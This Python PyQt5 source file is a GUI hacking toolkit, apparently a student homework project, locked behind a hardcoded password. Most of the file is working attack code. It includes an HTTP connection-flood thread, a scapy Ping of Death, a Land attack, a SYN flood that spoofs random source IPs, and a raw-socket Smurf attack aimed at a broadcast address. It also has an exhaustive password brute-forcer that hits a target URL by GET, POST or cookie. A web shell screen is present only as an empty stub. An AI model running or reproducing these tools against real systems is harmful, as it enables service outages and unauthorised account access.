from PyQt5.QtWidgets import *
from PyQt5.QtWidgets import QMainWindow, QStackedWidget, QTextBrowser
from PyQt5.QtCore import QThread, pyqtSignal, QTimer
from PyQt5 import uic
from scapy.all import *
import sys
import requests
import time
import itertools
import argparse
import socket
import threading
import os
from PyQt5.QtWidgets import QMainWindow
from scapy.all import IP, ICMP, send, TCP
import random

form_class1 = uic.loadUiType("ppimppie_title.ui")[0]
form_class2 = uic.loadUiType("brute_force.ui")[0]
form_class3 = uic.loadUiType("attck_result.ui")[0]
form_class4 = uic.loadUiType("Dos_Attack.ui")[0]
form_class5 = uic.loadUiType("Dos_fdsa.ui")[0]
form_class6 = uic.loadUiType("web_shall.ui")[0]

form_class_1 = uic.loadUiType("first_loading.ui")[0]
form_class_2 = uic.loadUiType("key_check.ui")[0]
# 좋은데 ~ 
# 몇시에 잘꺼임??
# 확인 
# 뭔지알지
# 이거 숙제긴해 
# 해킹툴 비슷한 



#=============================================================
class WindowClass(QMainWindow, form_class_1) : 
    def __init__(self) :
        super().__init__()
        self.setupUi(self)

        self.btn1.clicked.connect(self.progress_loading)
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_progress)
        self.progress = 0

    def progress_loading(self):
        self.progress = 0
        self.timer.start(100)  # 100ms마다 timeout 이벤트 발생

    def update_progress(self):
        if self.progress <= 100:
            self.progressBar.setValue(self.progress)
            self.progress += 2
        #     if self.progress == 52 :#---------------------------------
        #         time.sleep(2)
        #         self.progress += 25:#----------------------------------------------------
        # else: 
            self.timer.stop()
            self.KEY_class()

    def KEY_class(self) :
        self.inputkey = Key_check()
        self.close()
        self.inputkey.show()
#=============================================================
class Key_check(QMainWindow, form_class_2) :
    def __init__(self):
        super().__init__()
        self.setupUi(self)

        self.lineEdit.setEchoMode(QLineEdit.Password)
        
        self.lineEdit.returnPressed.connect(self.check_key)
        self.btn2.clicked.connect(self.check_key)

    def check_key(self) :
        # text = self.lineEdit.toPlainText()
        text = self.lineEdit.text()
        # print(text)
        if text == "alsrl" :
            print("open")
            self.title_class()
        else : 
            print("fall")

    def title_class(self) :
        self.title = ppimppie_title()
        self.close()
        self.title.show()

#=============================================================
#=============================================================
# class ppimppie_title(QMainWindow, form_class_3) :
#     def __init__(self):
#         super().__init__()
#         self.setupUi(self)
#=============================================================
#=============================================================

class ppimppie_title(QMainWindow, form_class1) : 
    def __init__(self) :
        super().__init__()
        self.setupUi(self)

        self.befo_btn.clicked.connect(self.brute)
        self.dos_btn.clicked.connect(self.Dos)
        self.w_shall_btn.clicked.connect(self.webshall)

    
    def brute(self) :
        self.befo = bruteforce()
        self.befo.show()

    def Dos(self) :
        self.dos = dos_choice()
        self.dos.show()

    def webshall(self) :
        self.ws = Webshall()
        self.ws.show()
# ============================타이틀 화면==============================
# ====================================================================
class dos_choice(QMainWindow, form_class4):
    def __init__(self):
        super().__init__()
        self.setupUi(self)

        self.d_btn.clicked.connect(self.dos)

        self.pod_btn.clicked.connect(self.ping_of_death)
        self.la_btn.clicked.connect(self.land_attack)
        self.synf_btn.clicked.connect(self.syn_flooding)
        self.s_btn.clicked.connect(self.smurf)


    def dos(self) :
        print("dos")
        self.test = Dos()
        self.test.show()

    def ping_of_death(self):
        print("ping of death")
        self.test = p_o_d()
        self.test.show()

    def land_attack(self):
        print("land attack")
        self.test = Land_attack()
        self.test.show()

    def syn_flooding(self): 
        print("syn_flooding")
        self.test = Syn_flooding()
        self.test.show()

    def smurf(self):
        print("smurf")
        self.test = Smurf()
        self.test.show()

# ========================================= Dos
class Dos(QMainWindow, form_class5):
    def __init__(self):
        super().__init__()
        self.setupUi(self)

        self.stackedWidget = self.findChild(QStackedWidget, "stackedWidget")
        self.stackedWidget.setCurrentIndex(0)

        self.next_btn.clicked.connect(self.start_attack)
        self.stop_btn.clicked.connect(self.stop_all_threads)

        # 사용자 입력값 초기화
        self.target = ""
        self.port = ""
        self.Trd = 0
        self.fake_ip = ""
        self.attack_threads = []  # 실행 중인 쓰레드 관리용 리스트

    def attack(self):
        self.stackedWidget.setCurrentIndex(1)
        self.textBrowser.append(f"Starting attack on {self.target}:{self.port} with fake IP {self.fake_ip}")

    def start_attack(self):
        # 입력값 읽기
        self.target = self.lineEdit_1.text().strip()
        self.port = self.lineEdit_2.text().strip()

        trd_input = self.lineEdit_3.text().strip()
        if not trd_input.isdigit():
            self.textBrowser.append("Error: Thread count must be a valid number. Defaulting to 1.")
            self.Trd = 1
        else:
            self.Trd = int(trd_input)

        self.fake_ip = self.lineEdit_4.text().strip()

        self.attack()  # 공격 시작 알림

        # 쓰레드 생성 및 실행
        for _ in range(self.Trd):
            attack_thread = AttackThread(self.target, self.port, self.fake_ip)
            attack_thread.update_log.connect(self.textBrowser.append)
            self.attack_threads.append(attack_thread)  # 리스트에 추가
            attack_thread.start()

    def stop_all_threads(self):
        # 실행 중인 모든 쓰레드 정리
        self.textBrowser.append("Stopping all threads...")
        for thread in self.attack_threads:
            thread.stop()
            thread.wait()  # 쓰레드 종료 대기
        self.attack_threads.clear()  # 리스트 초기화
        self.textBrowser.append("All threads stopped.")

    def closeEvent(self, event):
        # 윈도우 닫힐 때 모든 쓰레드 종료
        self.stop_all_threads()
        event.accept()
class AttackThread(QThread):
    update_log = pyqtSignal(str)

    def __init__(self, target, port, fake_ip):
        super().__init__()
        self.target = target
        self.port = int(port)
        self.fake_ip = fake_ip
        self.running = True
        self.attack_num = 0

    def run(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, self.port))
                s.sendall(f"GET / HTTP/1.1\r\nHost: {self.fake_ip}\r\n\r\n".encode('ascii'))
                s.close()
                self.attack_num += 1
                self.update_log.emit(f"Attack sent: {self.attack_num}")
            except Exception as e:
                self.update_log.emit(f"Connection error: {e}")

    def stop(self):
        self.running = False
# =========================================

# ========================================= Ping of death
class p_o_d(QMainWindow, form_class5):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.stackedWidget.setCurrentIndex(2)

        self.attack_btn.clicked.connect(self.main)

    def main(self):
        # 사용자 입력값 동적으로 가져오기
        self.source_ip = self.lineEdit_5.text().strip()
        self.target_ip = self.lineEdit_6.text().strip()
        self.message = self.lineEdit_7.text().strip() or "T"  # 기본 메시지 설정
        try:
            self.packet_size = int(self.lineEdit_8.text().strip()) or 60000  # 기본값 60000
            self.number_packets = int(self.lineEdit_9.text().strip()) or 5  # 기본값 5
        except ValueError:
            self.textBrowser.append("[ERROR] Invalid input for packet size or number of packets.")
            return

        self.stackedWidget.setCurrentIndex(1)

        # 패킷 크기 제한 경고
        if self.packet_size > 65000:
            self.textBrowser.append("Warning: Packet size exceeds 65000 bytes. This may cause issues in some environments.")

        try:
            # Ping of Death 패킷 생성
            pod_packet = IP(src=self.source_ip, dst=self.target_ip) / ICMP() / (self.message * self.packet_size)

            self.textBrowser.append(f"\n[INFO] Sending {self.number_packets} packets to {self.target_ip}...")
            for i in range(self.number_packets):
                send(pod_packet, verbose=False)
                self.textBrowser.append(f"[INFO] Packet {i + 1}/{self.number_packets} sent successfully.")
            self.textBrowser.append("\n[INFO] All packets sent.")

        except Exception as e:
            self.textBrowser.append(f"[ERROR] An error occurred: {e}")
# =========================================

# ========================================= land_attack
class Land_attack(QMainWindow, form_class5):
    def __init__(self):
        super().__init__()
        self.setupUi(self)

        self.stackedWidget.setCurrentIndex(3)
        self.attack_btn_2.clicked.connect(self.main)

    def main(self):
        # 입력값 동적으로 가져오기
        target_ip = self.lineEdit_10.text().strip()
        target_port = self.lineEdit_11.text().strip()
        packets_count = self.lineEdit_12.text().strip()
        delay = self.lineEdit_13.text().strip()

        self.stackedWidget.setCurrentIndex(1)
        self.textBrowser.append("=== Land Attack Test Tool ===")

        try:
            # 입력값 검증 및 변환
            if not target_ip or not target_port or not packets_count or not delay:
                raise ValueError("All fields must be filled.")

            target_port = int(target_port)
            packets_count = int(packets_count)
            delay = float(delay)

            if target_port <= 0 or packets_count <= 0 or delay < 0:
                raise ValueError("Invalid values: Port and packet count must be positive, and delay must be non-negative.")

            # Land Attack 패킷 생성
            pkt = IP(src=target_ip, dst=target_ip) / TCP(sport=target_port, dport=target_port)

            self.textBrowser.append(f"\n[INFO] Starting Land Attack test on {target_ip}:{target_port}...\n")

            for i in range(packets_count):
                send(pkt, verbose=False)  # 패킷 전송
                self.textBrowser.append(f"[INFO] Packet {i + 1}/{packets_count} sent.")
                time.sleep(delay)  # 지연 시간

            self.textBrowser.append("\n[INFO] All packets sent. Test completed.")

        except ValueError as ve:
            self.textBrowser.append(f"[ERROR] {ve}")

        except Exception as e:
            self.textBrowser.append(f"[ERROR] An error occurred: {e}")
# =========================================

# ========================================= SYN_flooding
class SynFloodThread(QThread):
    update_log = pyqtSignal(str)  # 로그 업데이트 시그널

    def __init__(self, target_ip, target_port, packets_count, delay):
        super().__init__()
        self.target_ip = target_ip
        self.target_port = target_port
        self.packets_count = packets_count
        self.delay = delay
        self.running = True  # 쓰레드 실행 상태 플래그

    def random_ip(self):
        """Generate a random IP address."""
        return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

    def random_port(self):
        """Generate a random port number."""
        return random.randint(1024, 65535)

    def run(self):
        total_packets = 0

        try:
            for i in range(self.packets_count):
                if not self.running:
                    break

                src_ip = self.random_ip()
                src_port = self.random_port()

                ip_packet = IP(src=src_ip, dst=self.target_ip)
                tcp_packet = TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(1000, 9000))

                send(ip_packet / tcp_packet, verbose=False)
                total_packets += 1

                self.update_log.emit(f"[INFO] Packet {i + 1}/{self.packets_count} sent: {src_ip}:{src_port} → {self.target_ip}:{self.target_port}")
                time.sleep(self.delay)

            self.update_log.emit(f"\n[INFO] SYN Flood attack completed. Total packets sent: {total_packets}")

        except Exception as e:
            self.update_log.emit(f"[ERROR] An error occurred: {e}")

    def stop(self):
        self.running = False
class Syn_flooding(QMainWindow, form_class5):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.stackedWidget.setCurrentIndex(4)
        self.attack_btn_3.clicked.connect(self.main)

        self.syn_thread = None  # 쓰레드 관리

    def main(self):
        # 입력값 가져오기
        self.stackedWidget.setCurrentIndex(1)
        target_ip = self.lineEdit_10.text().strip()
        target_port = self.lineEdit_11.text().strip()
        packets_count = self.lineEdit_12.text().strip()
        delay = self.lineEdit_13.text().strip()

        # 입력값 검증
        try:
            if not target_ip or not target_port or not packets_count or not delay:
                raise ValueError("All fields must be filled.")

            target_port = int(target_port)
            packets_count = int(packets_count)
            delay = float(delay)

            if not (0 < target_port <= 65535):
                raise ValueError("Port number must be between 1 and 65535.")
            if packets_count <= 0 or delay < 0:
                raise ValueError("Packet count must be positive, and delay must be non-negative.")

        except ValueError as ve:
            self.textBrowser.append(f"[ERROR] {ve}")
            return

        # SYN Flood 공격 시작
        self.textBrowser.append("=== SYN Flood Test Tool ===")
        self.textBrowser.append(f"\n[INFO] Starting SYN Flood attack on {target_ip}:{target_port}...\n")

        # 쓰레드 생성 및 시작
        self.syn_thread = SynFloodThread(target_ip, target_port, packets_count, delay)
        self.syn_thread.update_log.connect(self.textBrowser.append)
        self.syn_thread.start()

    def stop_attack(self):
        if self.syn_thread and self.syn_thread.isRunning():
            self.syn_thread.stop()
            self.syn_thread.wait()
            self.textBrowser.append("\n[INFO] SYN Flood attack stopped.")
# ========================================= 

# ========================================= Smurf
class SmurfAttackThread(QThread):
    update_log = pyqtSignal(str)

    def __init__(self, source_ip, broadcast_ip, count):
        super().__init__()
        self.source_ip = source_ip
        self.broadcast_ip = broadcast_ip
        self.count = count
        self.running = True  # 쓰레드 상태 플래그

    def IPHeader(self, source, destination, proto):
        """Create an IP header."""
        packet = b''
        packet += b'\x45'  # Version + Header Length
        packet += b'\x00'  # Type of Service
        packet += b'\x00\x54'  # Total Length
        packet += b'\xab\xcd'  # Identification
        packet += b'\x40'  # Flags
        packet += b'\x00'  # Fragment Offset
        packet += b'\x40'  # TTL
        packet += proto  # Protocol
        packet += b'\x00\x00'  # Header Checksum
        packet += socket.inet_aton(source)  # Source IP
        packet += socket.inet_aton(destination)  # Destination IP
        return packet

    def CreateICMPRequest(self):
        """Create an ICMP Echo Request."""
        packet = b''
        packet += b'\x08'  # ICMP Type (Echo Request)
        packet += b'\x00'  # Code
        packet += b'\x00\x00'  # Checksum
        packet += b'\x12\x34'  # Identifier
        packet += b'\x00\x01'  # Sequence Number
        packet += b'\x61' * 56  # Payload (56 bytes)
        return packet

    def run(self):
        try:
            icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            icmp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            self.update_log.emit(f"[INFO] Sending {self.count} ICMP Echo Requests from {self.source_ip} to {self.broadcast_ip}...\n")

            for i in range(self.count):
                if not self.running:
                    break

                packet = self.IPHeader(self.source_ip, self.broadcast_ip, b'\x01') + self.CreateICMPRequest()
                icmp_socket.sendto(packet, (self.broadcast_ip, 0))
                self.update_log.emit(f"[INFO] Packet {i + 1}/{self.count} sent.")
                time.sleep(0.1)

            icmp_socket.close()
            self.update_log.emit("[INFO] Smurf Attack completed.")

        except PermissionError:
            self.update_log.emit("[ERROR] You need root privileges to run this script.")

        except Exception as e:
            self.update_log.emit(f"[ERROR] {e}")

    def stop(self):
        self.running = False
class Smurf(QMainWindow, form_class5):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.smurf_thread = None  # 쓰레드 관리
        self.stackedWidget.setCurrentIndex(5)

        self.attack_btn_4.clicked.connect(self.main)
        self.stop_btn.clicked.connect(self.stop_attack)

    def main(self):
        # 입력값 가져오기
        self.stackedWidget.setCurrentIndex(1)
        source_ip = self.lineEdit_10.text().strip()
        broadcast_ip = self.lineEdit_11.text().strip()
        count = self.lineEdit_12.text().strip()

        # 입력값 검증
        try:
            if not source_ip or not broadcast_ip or not count:
                raise ValueError("All fields must be filled.")

            count = int(count)
            if count <= 0:
                raise ValueError("Count must be a positive number.")

        except ValueError as ve:
            self.textBrowser.append(f"[ERROR] {ve}")
            return

        # Smurf 공격 시작
        self.smurf_thread = SmurfAttackThread(source_ip, broadcast_ip, count)
        self.smurf_thread.update_log.connect(self.textBrowser.append)
        self.smurf_thread.start()

    def stop_attack(self):
        if self.smurf_thread and self.smurf_thread.isRunning():
            self.smurf_thread.stop()
            self.smurf_thread.wait()
            self.textBrowser.append("[INFO] Smurf Attack stopped.")
# ========================================= 

# ========================================= bruteforce
class bruteforce(QMainWindow, form_class2) :
    data_signal = pyqtSignal(str, str, int, int, str, str, str, str ,str, str)  # Signal 정의


    def __init__(self):
        super().__init__()
        self.setupUi(self)
#--------------------------------------------------------------------------------------------------------------
        self.url = self.findChild(QLineEdit, "url_lineEdit")  # URL 입력란
        self.char_set = self.findChild(QLineEdit, "char_set_lineEdit")  # URL 입력란
        self.min_length = self.findChild(QLineEdit, "min_length_lineEdit")  # URL 입력란
        self.max_length = self.findChild(QLineEdit, "max_length_lineEdit")  # URL 입력란
        self.log_file = self.findChild(QLineEdit, "log_file_lineEdit")  # URL 입력란
        # page 2
        self.success_message = self.findChild(QLineEdit, "success_message_lineEdit")  # URL 입력란
        self.cookies_key = self.findChild(QLineEdit, "cookies_key_lineEdit")  # URL 입력란
        self.password_param = self.findChild(QLineEdit, "password_param_lineEdit")  # URL 입력란
#--------------------------------------------------------------------------------------------------------------

        self.log_file_lineEdit.setEnabled(False)  # 기본적으로 비활성화
        self.cookies_key_lineEdit.setEnabled(False)

        self.checkBox.stateChanged.connect(self.toggle_lineedit1)  # 체크 상태 변경 시 호출

        self.stackedWidget = self.findChild(QStackedWidget, "stackedWidget")
        self.stackedWidget.setCurrentIndex(0)

#================================ 다음/이전 페이지 버튼
        # 버튼 클릭 이벤트 연결
        self.next_btn.clicked.connect(self.show_page2)
        self.back_btn2.clicked.connect(self.show_page2)
        self.back_btn.clicked.connect(self.show_page1)
        self.final_btn.clicked.connect(self.show_page3)
        self.start_btn.clicked.connect(self.send_data)
        self.start_btn.clicked.connect(self.attck)
    # 버튼 클릭 시 Signal 발신

#================================
        # ComboBox
        self.combo = self.findChild(QComboBox, "comboBox")
        # 선택 변경 시 실행될 함수 연결
        self.combo.currentIndexChanged.connect(self.combobox_changed)
#===================================================================


# ============================== 브포 기능 ========================

    def show_page1(self) :
        print("page1")
        self.stackedWidget.setCurrentIndex(0)

    def show_page2(self) :
        try:
            # 입력값 가져오기
            url = self.url_lineEdit.text().strip()
            char_set = self.char_set_lineEdit.text().strip()
            min_length = self.min_length_lineEdit.text().strip()
            max_length = self.max_length_lineEdit.text().strip()
            method = self.combo.currentText().strip()
            log_file = self.log_file_lineEdit.text().strip()

        # 필수 입력값 검증
            if not url:
                QMessageBox.warning(self, "입력 오류", "URL을 입력해주세요.")
                return
            
            if not char_set:
                QMessageBox.warning(self, "입력 오류", "Character Set을 입력해주세요.")
                return
            
            if not min_length:
                QMessageBox.warning(self, "입력 오류", "최소 길이를 입력해주세요.")
                return
            
            if not max_length:
                QMessageBox.warning(self, "입력 오류", "최대 길이를 입력해주세요.")
                return
            
            if not method:
                QMessageBox.warning(self, "입력 오류", "방식을 선택해주세요.")
                return

        # 숫자 변환 및 검증
            try:
                min_length_int = int(min_length)
                max_length_int = int(max_length)
            
                if min_length_int < 1:
                    QMessageBox.warning(self, "INPUT ERROR", "최소 길이는 1 이상이어야 합니다.")
                    return
                
                if max_length_int < min_length_int:
                    QMessageBox.warning(self, "INPUT ERROR", "최대 길이는 최소 길이보다 커야 합니다.")
                    return
                
            except ValueError:
                QMessageBox.warning(self, "INPUT ERROR", "길이는 숫자로 입력해주세요.")
                return

        # 모든 검증을 통과하면 값 저장
            self.saved_url = url
            self.saved_char_set = char_set
            self.saved_min_length = min_length_int
            self.saved_max_length = max_length_int
            self.saved_method = method
            self.saved_log_file = log_file or None

        except Exception as e:
                QMessageBox.critical(self, "오류", f"예상치 못한 오류가 발생했습니다.\n{str(e)}")

        # print("url : ", url)
        # print("char_set : ", char_set)
        # print("min_length : ",min_length)
        # print("max_length : ",max_length)
        # print("log_file : ",log_file)
        # print("methed : ", method)

        print("page2")
        self.stackedWidget.setCurrentIndex(1)
        current_page = self.stackedWidget.currentIndex()
        if current_page == 1:
            print('fdsa')

    def show_page3(self) :
        success_message = self.success_message_lineEdit.text()
        cookies_key = self.cookies_key_lineEdit.text()
        password_param = self.password_param_lineEdit.text()
        headers = self.headers_lineEdit.text()        

        try :
            if not success_message:
                QMessageBox.warning(self, "입력 오류", "Success_message을 입력해주세요.")
                return

            if headers :
                headersaa = {item.split(':')[0].strip(): item.split(':')[1].strip() for item in headers.split(',')} if headers else None
                self.saved_headers = headersaa  # 검증없음
            else : 
                self.saved_headers = headers


            self.saved_cookies_key = cookies_key        # 검증없음
            self.saved_password_param = password_param  # 검증없음
            self.saved_success_message = success_message


        except Exception as e:
                QMessageBox.critical(self, "오류", f"예상치 못한 오류가 발생했습니다.\n{str(e)}")

        print("page3")
        self.stackedWidget.setCurrentIndex(2)
        self.url_label.setText(f"{self.saved_url}")  # 텍스트 설정
        self.min_len_label.setText(f"{self.saved_min_length}")  # 텍스트 설정
        self.max_len_label.setText(f"{self.saved_max_length}")  # 텍스트 설정
        self.char_set_label.setText(f"{self.saved_char_set}")  # 텍스트 설정
        self.success_label.setText(f"{self.saved_success_message}")  # 텍스트 설정
        self.method_label.setText(f"{self.saved_method}")  # 텍스트 설정
        self.headers_label.setText(f"{self.saved_headers}")  # 텍스트 설정
        self.param_label.setText(f"{self.saved_password_param}")  # 텍스트 설정
        self.cookies_label.setText(f"{self.saved_cookies_key}")  # 텍스트 설정
        self.log_file_label.setText(f"{self.saved_log_file}")  # 텍스트 설정

    def send_data(self):
        # Signal 발신 (emit)
        self.data_signal.emit(
            self.saved_url,
            self.saved_char_set,
            self.saved_min_length,
            self.saved_max_length,
            self.saved_method,
            self.saved_password_param,
            self.saved_success_message,
            self.saved_cookies_key,
            self.saved_log_file,
            self.saved_headers)

    def attck(self):
        self.test = attck_result1()
        self.test.show()
        time.sleep(2)
        self.data_signal.connect(self.test.receive_data)
        self.send_data()  # 여기서 데이터 전송


    def attack(self) :
        print("공격")

#==============================================================
    def combobox_changed(self):
        methed = self.combo.currentText()
        if methed == "COOKIE" :
            self.cookies_key_lineEdit.setEnabled(True)
            self.password_param_lineEdit.setEnabled(False)

        else :
            self.cookies_key_lineEdit.setEnabled(False)
            self.password_param_lineEdit.setEnabled(True)
    #     # 현재 선택된 텍스트 출력
    #     print(f"선택된 값: {self.combo.currentText()}")
    #     # 현재 선택된 인덱스 출력 (필요한 경우)
    #     print(f"선택된 인덱스: {self.combo.currentIndex()}")

    def toggle_lineedit1(self, state):#log파일 함수
        # CheckBox 상태에 따라 LineEdit 활성화/비활성화
        if state == 2:  # Checked 상태
            self.log_file_lineEdit.setEnabled(True)
        else:  # Unchecked 상태
            self.log_file_lineEdit.setEnabled(False)
class attck_result1(QMainWindow, form_class3) : 
    def __init__(self) :
        super().__init__()
        self.setupUi(self)

    def receive_data(self, 
    url,
    char_set,
    min_length,
    max_length,
    method,
    password_param,
    success_message,
    cookies_key,
    log_file,
    headers,
    ):
        self.URL_label.setText(url)
        print("attck")
        print("URL:", url)
        print("Character Set:", char_set)
        print("Minimum Password Length:", min_length)
        print("Maximum Password Length:", max_length)
        print("HTTP Method:", method)
        print("Password Parameter:", password_param)
        print("Success Message:", success_message)
        print("Cookies Key:", cookies_key)
        print("Log File:", log_file)
        print("Headers:", headers)
        QApplication.processEvents()  # 강제로 UI 업데이트
        time.sleep(3)

        self.result_textEdit.setText("Brute Force 시작!\n")
        start_time = time.time()
        attempts = 0

        # 세션 객체 생성
        session = requests.Session()
        if headers:
            session.headers.update(headers)

        # 패스워드 길이별 조합 생성 및 시도
        for length in range(min_length, max_length + 1):
            for combination in itertools.product(char_set, repeat=length):
                attempt = ''.join(combination)
                attempts += 1

                # 요청 데이터 설정
                try:
                    if method.upper() == "POST" or method == "2":
                        data = {password_param: attempt}
                        response = session.post(url, data=data)
                    elif method.upper() == "GET" or method == "1":
                        params = {password_param: attempt}
                        response = session.get(url, params=params)
                    elif method.upper() == "COOKIE" or method == "3":
                        cookies = {cookies_key: attempt}
                        response = session.get(url, cookies=cookies)
                    else:
                        print("잘못된 요청 방식입니다. 'GET', 'POST', 'COOKIE' 중 하나를 선택하세요.")
                        return None

                    # 로그 파일 기록
                    if log_file:
                        with open(log_file, "a") as log:
                            log.write(f"시도: {attempt}\n")

                    # 서버 응답 확인
                    if success_message in response.text:
                        # print(f"\n찾은 값: {attempt}")
                        # end_time = time.time()
                        # print(f"걸린 시간: {end_time - start_time:.2f}초")
                        # print(f"총 시도 횟수: {attempts}")
                        # print("================================================")
                        # print(response.text)
                        self.result_textEdit.setText(f"\n찾은 값: {attempt}\n")
                        end_time = time.time()
                        self.result_textEdit.setText(f"걸린 시간: {end_time - start_time:.2f}초\n")
                        self.result_textEdit.setText(f"총 시도 횟수: {attempts}\n")
                        self.html_textBrowser.setText(response.text)

                        # 결과 파일 저장
                        with open("found_result.txt", "w") as result_file:
                            result_file.write(f"찾은 값: {attempt}\n")
                            result_file.write(f"걸린 시간: {end_time - start_time:.2f}초\n")
                            result_file.write(f"총 시도 횟수: {attempts}\n")
                        return response.text
                    else:
                        # print(f"시도 중: {attempt} (실패)", end="\r")
                        self.result_textEdit.setText(f"시도 중: {attempt} (실패)")
                except requests.RequestException as e:
                    # print(f"\n요청 중 오류 발생: {e}")
                    self.result_textEdit.setText(f"\n요청 중 오류 발생: {e}")
                    return None

        # print("\n값을 찾지 못했습니다.")
        self.result_textEdit.setText("\n값을 찾지 못했습니다.")
        return None
# ========================================= 

class Webshall(QMainWindow, form_class6):
    def __init__(self) :
        super().__init__()
        self.setupUi(self)
    

if __name__ == '__main__' : 
    app = QApplication(sys.argv)
    mywindow = WindowClass()
    mywindow.show()
    app.exec_()